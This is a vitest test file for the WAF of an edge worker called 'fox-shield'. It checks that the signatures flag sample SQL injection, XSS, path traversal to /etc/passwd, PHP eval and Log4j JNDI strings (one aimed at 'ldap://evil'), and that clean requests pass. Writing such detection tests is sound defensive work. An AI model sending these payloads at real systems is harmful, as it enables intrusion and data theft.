/**
 * fox-shield edge worker — WAF tests.
 *
 * Verifies that the 20+ signature set catches OWASP payloads (SQLi, XSS, RCE,
 * traversal, Log4j) and that clean requests pass through.
 */

import { describe, it, expect } from 'vitest';
import { Waf, DEFAULT_WAF_RULES } from '../src/waf';
import { MemoryStore } from '../src/store';

function makeWaf(): Waf {
  return new Waf(new MemoryStore());
}

describe('WAF signature set', () => {
  it('has 20+ signatures', () => {
    expect(DEFAULT_WAF_RULES.length).toBeGreaterThanOrEqual(20);
  });

  it('detects SQL injection (union select)', () => {
    const waf = makeWaf();
    const m = waf.match('GET', '/search', '?q=1', "union select username,password from users");
    expect(m).not.toBeNull();
    expect(m?.category).toBe('sqli');
  });

  it('detects SQL injection (or 1=1)', () => {
    const waf = makeWaf();
    const m = waf.match('POST', '/login', '', "user=1 or 1=1");
    expect(m).not.toBeNull();
    expect(m?.category).toBe('sqli');
  });

  it('detects XSS (<script>)', () => {
    const waf = makeWaf();
    const m = waf.match('GET', '/', '?q=<script>alert(1)</script>', '');
    expect(m).not.toBeNull();
    expect(m?.category).toBe('xss');
  });

  it('detects XSS (onerror=)', () => {
    const waf = makeWaf();
    const m = waf.match('GET', '/', '', '<img src=x onerror=alert(1)>');
    expect(m).not.toBeNull();
    expect(m?.category).toBe('xss');
  });

  it('detects RCE (etc/passwd traversal)', () => {
    const waf = makeWaf();
    const m = waf.match('GET', '/download', '?file=/etc/passwd', '');
    expect(m).not.toBeNull();
    expect(m?.category).toBe('traversal');
  });

  it('detects path traversal (../)', () => {
    const waf = makeWaf();
    const m = waf.match('GET', '/', '?p=../../etc/passwd', '');
    expect(m).not.toBeNull();
  });

  it('detects RCE (eval()', () => {
    const waf = makeWaf();
    const m = waf.match('GET', '/', '', 'eval($_POST["x"])');
    expect(m).not.toBeNull();
    expect(m?.category).toBe('rce');
  });

  it('detects Log4j (jndi:ldap)', () => {
    const waf = makeWaf();
    const m = waf.match('GET', '/', '?x=${jndi:ldap://evil}', '');
    expect(m).not.toBeNull();
    expect(m?.category).toBe('rce');
  });

  it('allows clean requests through', () => {
    const waf = makeWaf();
    const m = waf.match('GET', '/', '?page=home&lang=en', '');
    expect(m).toBeNull();
  });
});
